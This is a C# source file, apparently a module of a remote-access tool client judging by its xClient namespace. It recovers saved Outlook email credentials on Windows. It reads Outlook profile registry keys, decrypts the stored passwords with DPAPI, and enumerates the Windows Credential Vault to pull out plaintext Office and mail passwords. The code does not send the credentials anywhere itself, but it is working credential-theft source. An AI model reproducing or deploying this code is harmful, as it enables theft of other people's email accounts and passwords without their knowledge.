using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using xClient.Core.Data;
using xClient.Core.Recovery.Utilities;

namespace xClient.Core.Recovery.Other
{
    public static class Outlook
    {
        [StructLayout(LayoutKind.Sequential)]
        internal struct CREDENTIAL
        {
            public int Flags;
            public int Type;
            [MarshalAs(UnmanagedType.LPWStr)] public string TargetName;
            [MarshalAs(UnmanagedType.LPWStr)] public string Comment;
            public long LastWritten;
            public int CredentialBlobSize;
            public IntPtr CredentialBlob;
            public int Persist;
            public int AttributeCount;
            public IntPtr Attributes;
            [MarshalAs(UnmanagedType.LPWStr)] public string TargetAlias;
            [MarshalAs(UnmanagedType.LPWStr)] public string UserName;
        }

        public enum CredentialType : uint
        {
            None = 0,
            Generic = 1,
            DomainPassword = 2,
            DomainCertificate = 3,
            DomainVisiblePassword = 4
        }

        [DllImport("Advapi32.dll", EntryPoint = "CredEnumerate", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr pCredentials);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [Flags]
        private enum CryptProtectFlags
        {
            // for remote-access situations where ui is not an option
            // if UI was specified on protect or unprotect operation, the call
            // will fail and GetLastError() will indicate ERROR_PASSWORD_RESTRICTION
            CRYPTPROTECT_UI_FORBIDDEN = 0x1,

            // per machine protected data -- any user on machine where CryptProtectData
            // took place may CryptUnprotectData
            CRYPTPROTECT_LOCAL_MACHINE = 0x4,

            // force credential synchronize during CryptProtectData()
            // Synchronize is only operation that occurs during this operation
            CRYPTPROTECT_CRED_SYNC = 0x8,

            // Generate an Audit on protect and unprotect operations
            CRYPTPROTECT_AUDIT = 0x10,

            // Protect data with a non-recoverable key
            CRYPTPROTECT_NO_RECOVERY = 0x20,


            // Verify the protection of a protected blob
            CRYPTPROTECT_VERIFY_PROTECTION = 0x40
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public CryptProtectPromptFlags dwPromptFlags;
            public IntPtr hwndApp;
            public String szPrompt;
        }

        [Flags]
        private enum CryptProtectPromptFlags
        {
            // prompt on unprotect
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 0x1,

            // prompt on protect
            CRYPTPROTECT_PROMPT_ON_PROTECT = 0x2
        }

        [DllImport("Crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn,
            IntPtr szDataDescr,
            IntPtr pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            CryptProtectFlags dwFlags,
            ref DATA_BLOB pDataOut
            );

        private static string BaseKeyNT =
            @"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676";

        private static string BaseKey =
            @"Software\Microsoft\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676";

        private static string BaseKey15 =
            @"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676";

        public static List<RecoveredAccount> GetSavedPasswords()
        {
            var retVal = new List<RecoveredAccount>();

            try
            {
                retVal.AddRange(Environment.OSVersion.Platform >= PlatformID.Win32NT
                    ? LoadFromRegistry(BaseKeyNT)
                    : LoadFromRegistry(BaseKey));
            }
            catch
            {
            }

            try
            {
                retVal.AddRange(LoadFromRegistry(BaseKey15));
            }
            catch
            {
            }

            try
            {
                retVal.AddRange(LoadFromVault());
            }
            catch
            {
            }

            return retVal;
        }

        private static List<RecoveredAccount> LoadFromRegistry(string baseRegKey)
        {
            var key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default);
            key = key.OpenSubKey(baseRegKey);

            var retVal = new List<RecoveredAccount>();

            foreach (var accountKey in GetAccountKeys(key))
            {
                var acc = new RecoveredAccount
                {
                    Application = "Outlook"
                };

                foreach (var valName in accountKey.GetValueNames())
                {
                    if (valName.ToLower().Contains("password"))
                    {
                        var encVal = accountKey.GetValue(valName) as byte[];
                        acc.Password =
                            Encoding.Unicode.GetString(ProtectedData.Unprotect(encVal.Skip(1).ToArray(), null,
                                DataProtectionScope.LocalMachine)).Trim('\0');
                    }
                    else if (valName.ToLower().Contains("email"))
                    {
                        acc.Username = Encoding.Unicode.GetString(accountKey.GetValue(valName) as byte[]).Trim('\0');
                    }
                }

                retVal.Add(acc);
            }

            return retVal;
        }

        private static List<RegistryKey> GetAccountKeys(RegistryKey baseKey)
        {
            var retVal = new List<RegistryKey>();

            foreach (var name in baseKey.GetSubKeyNames())
            {
                foreach (var valName in baseKey.OpenSubKey(name).GetValueNames())
                {
                    if (valName.ToLower().Contains("password"))
                        retVal.Add(baseKey.OpenSubKey(name));
                }
            }

            return retVal;
        }

        // Outlook >= 2016
        private static List<RecoveredAccount> LoadFromVault()
        {
            int count;
            IntPtr pCredentials;
            var ret = CredEnumerate(null, 0, out count, out pCredentials);

            if (ret == false)
                return new List<RecoveredAccount>();

            var credentials = new IntPtr[count];

            for (var n = 0; n < count; n++)
                credentials[n] = Marshal.ReadIntPtr(pCredentials,
                    n*Marshal.SizeOf(typeof(IntPtr)));

            var accounts = new List<RecoveredAccount>();

            foreach (var cred in credentials.Select(x => (CREDENTIAL) Marshal.PtrToStructure(x, typeof(CREDENTIAL))))
            {
                if (!cred.TargetName.Contains(":"))
                    continue;
                var startStr = cred.TargetName.Split(':')[0].ToLower();

                if (startStr.Contains("office")
                    || startStr.Contains("outlook")
                    || startStr.Contains("mail"))
                {
                    if (cred.CredentialBlobSize > 0)
                    {
                        accounts.Add(new RecoveredAccount
                        {
                            Application = "Outlook",
                            Username = cred.TargetName.Substring(cred.TargetName.LastIndexOf(':') + 1),
                            Password = Marshal.PtrToStringUni(cred.CredentialBlob, cred.CredentialBlobSize/2)
                        });
                    }
                }
            }

            return accounts;
        }
    }
}
